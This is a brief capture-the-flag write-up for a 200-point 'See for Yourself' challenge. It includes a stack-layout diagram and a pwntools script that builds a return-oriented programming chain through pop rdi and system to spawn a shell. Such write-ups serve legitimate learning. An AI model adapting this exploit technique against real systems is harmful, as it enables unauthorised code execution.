### See for Yourself (200 Points)

> The matrix requires a more advanced trick this time. Hack it.
>
> [attachment](simplerop-af22071fcb7a6df9175940946a6d45e5)

About this challenge, we can use ROP to control the program steam. Avoid the effects of environment we can lay out the stack like this ⬇️

```
+--------------+
|  fake rbp    |
+--------------+
|    ret       |
+--------------+
|    ret       |
+--------------+
|    ret       |
+--------------+
|  pop rdi;ret |
+--------------+
|  & "bin/sh"  |
+--------------+
|  system_plt  |
+--------------+
+     ...      +

```

#### exploit script

```python
#!/usr/bin/env python
from pwn import *

p = process('./simplerop-af22071fcb7a6df9175940946a6d45e5')
#p = remote('chal.ctf.b01lers.com',1008)
elf = ELF('./simplerop-af22071fcb7a6df9175940946a6d45e5')
rop = ROP(elf)

p.recvuntil('yourself.\n')
#gdb.attach(p)
p.sendline('A'*8+p64(rop.ret[0])*3+p64(rop.rdi[0])+p64(elf.search('/bin/sh').next())+p64(0x401080))


p.interactive()

```

